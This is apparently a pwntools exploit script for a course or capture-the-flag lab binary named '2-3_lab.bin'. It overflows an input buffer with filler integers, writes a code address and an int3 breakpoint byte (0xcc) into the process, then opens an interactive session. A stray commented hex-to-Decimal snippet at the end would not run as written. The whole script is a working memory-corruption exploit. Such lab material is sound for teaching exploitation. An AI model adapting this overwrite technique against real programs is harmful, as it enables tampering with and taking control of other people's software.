from pwn import *

context.arch="x86_64"

# Set opcode location
OP_LOC = 4199382  # Location as a decimal 0x4013d6 = 4199382


# Set buffer size
BUFFER_SIZE = 8
BLANK = b"0"  # Convert to bytes
EXIT = b"-1 "  # Convert to bytes

SOFT_BREAK = 204  # Decimal form of 0xcc = int3 (software breakpoint)


p = process("./2-3_lab.bin")  # Uncomment to Test Script Locally
#p = gdb.debug("./2-3_lab.bin")


# Define input values
buff_filler = [2863311530, 3149642683]

# Create a loop to send input values
for x in range(BUFFER_SIZE - 1):
    for each in buff_filler:
        p.sendline(str(each).encode())  # Send the input value twice

p.sendline(str(OP_LOC).encode())  # Send the opcode location as bytes
p.sendline(BLANK)  

p.sendline(str(SOFT_BREAK).encode())  # Send the opcode location as bytes
p.sendline(BLANK)

p.sendline(EXIT)  # Send exit code

p.interactive()
'''
hex_number = '1A'
decimal_value = Decimal(int(hex_number, 16))
print(decimal_value)  # Output: Decimal('26')
'''
